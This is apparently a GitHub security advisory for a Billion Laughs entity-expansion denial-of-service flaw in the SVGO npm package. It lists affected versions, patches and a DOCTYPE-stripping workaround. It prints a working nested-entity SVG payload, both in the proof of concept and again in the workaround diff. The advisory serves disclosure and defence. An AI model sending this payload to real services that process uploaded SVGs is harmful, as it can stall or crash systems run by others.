# [H] SVGO DoS through entity expansion in DOCTYPE (Billion Laughs)

## Summary
Severity: High
Advisory: GHSA-xpqw-6gx7-v673
CVE: CVE-2026-29074
CWE: CWE-776
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-xpqw-6gx7-v673
Type: github-advisory

## Affected
- npm: `svgo` — affected >=2.1.0 <2.8.1
- npm: `svgo` — affected >=3.0.0 <3.3.3
- npm: `svgo` — affected >=4.0.0 <4.0.1

## Details
### Summary

SVGO accepts XML with custom entities, without guards against entity expansion or recursion. This can result in a small XML file (811 bytes) stalling the application and even crashing the Node.js process with `JavaScript heap out of memory`.

### Details

The upstream XML parser ([sax](https://www.npmjs.com/package/sax)) doesn't interpret custom XML entities by default. We pattern matched custom XML entities from the `DOCTYPE`, inserting them into `parser.ENTITIES`, and enabled `unparsedEntities`. This gives us the desired behavior of supporting SVGs with entities declared in the `DOCTYPE`.

However, entities can reference other entities, which can enable small SVGs to explode exponentially when we try to parse them.

#### Proof of Concept

```js
import { optimize } from 'svgo';

/** Presume that this string was obtained in some other way, such as network. */
const original = `
  <?xml version="1.0"?>
  <!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  ]>
  <lolz>&lol9;</lolz>
`;

optimize(original);
```

### Impact

If SVGO is run on untrusted input (i.e., user uploaded to server-side application), then the untrusted SVG can effectively stall or crash the application with an SVG < 1 KB in size.

It's unlikely to impact users who just use SVGO locally on their own SVGs or in build pipelines.

### Patches

SVGO has patched v4.0.1, v3.3.3, and v2.8.1! However, it's strongly recommended to upgrade to v4 regardless, as previous versions are not officially supported anymore.

### Workarounds

#### == 4.0.0

For v4, users do not specifically have to upgrade SVGO, though it is recommended to do so. A package manager can be used to upgrade sax recursively:

For example:

```sh
yarn up -R sax
```

New options were introduced upstream which makes the way SVGO parses SVGs safe by default.

#### >= 2.1.0, <= 3.3.2

Users of v3 and v2 will have to take manual action. If users can't upgrade, they may be able to work around this as long as the project doesn't require support for custom XML entities, though it's not a simple flag.

Parse the DOCTYPE directly and check for the presence of custom entities. If entities are present, throw/escape before passing them to SVGO.

```diff
+ import SAX from 'sax';
  import { optimize } from 'svgo';

- const original =`
+ let original = `
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
  `;

+ const parser = SAX.parser();
+ /** @param {string} doctype */
+ parser.ondoctype = (doctype) => {
+   original = original.replace(doctype, '');
+ }
+ parser.write(original);

  optimize(original);
```

### Resources

* [Wikipedia: Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)

## References
- https://github.com/svg/svgo/security/advisories/GHSA-xpqw-6gx7-v673
- https://nvd.nist.gov/vuln/detail/CVE-2026-29074
- https://github.com/svg/svgo
